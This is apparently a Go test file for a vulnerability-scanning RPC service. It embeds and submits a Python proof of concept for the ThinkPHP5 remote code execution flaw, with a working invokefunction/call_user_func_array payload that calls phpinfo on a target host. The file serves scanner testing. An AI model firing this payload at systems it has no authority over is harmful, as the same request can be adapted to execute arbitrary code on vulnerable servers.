package pocsuite

import (
	"fmt"
	"testing"
)

func TestGetArea(t *testing.T) {
	err := testRpc()
	if err != nil {
		fmt.Println(err.Error())
	}
}

func testRpc() error {
	// 新建rpc 客户端
	rpcClient, err := NewRpcPocClient("127.0.0.1:50051", 10)
	if err != nil {
		return err
	}
	pythonScript := []byte(`#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import requests
import re
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib3.exceptions import InsecureRequestWarning

from lib import PocBase


class DemoPOC(PocBase):
    vulID = 'Huaun-2020-00076'
    cveID = 'CNVD-2019-01092'
    version = '1.0'
    author = ['xp']
    vulDate = '2019-01-11'
    createDate = '2020-04-10'
    updateDate = ''
    references = ['']
    name = 'ThinkPHP5-5.0.x_5.1.x_RCE'
    appPowerLink = ''
    appName = 'ThinkPHP5'
    appVersion = 'v<5.0.22,v<5.1.31'
    vulType = 'RCE'
    desc = '''ThinkPHP5 5.0.x和5.1.x版本存在远程代码执行漏洞'''

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }
        payload = r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        try:
            vul_url = self.url + payload
            res = requests.get(vul_url, headers=headers, timeout=5, verify=False)
            if r"Configuration" and r"php.ini"in res.text:
                result = {
                    "vulID": f'{DemoPOC.cveID},{DemoPOC.vulID}',
                    "name": DemoPOC.name,
                    "desc": DemoPOC.desc,
                    "url": vul_url,
                    "info": ""
                }
        except:
            pass

        return result
`)
	resultByte, err := rpcClient.ExecPythonSerialize("192.168.105.23", "80", "6666", pythonScript)
	fmt.Println(string(*resultByte))
	return nil
}
